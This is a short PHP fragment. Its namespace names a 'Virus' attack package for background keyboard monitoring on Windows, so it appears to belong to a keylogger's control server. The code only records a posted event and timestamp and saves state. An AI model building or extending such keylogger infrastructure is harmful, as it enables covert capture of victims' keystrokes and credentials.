<?php

/** @var \Kelvinho\Virus\Attack\Packages\Windows\Background\MonitorKeyboard\MonitorKeyboard $this */

$this->updateEventFromController($this->requestData->postCheck("event"), $this->requestData->postCheck("unixTime"))->saveState();
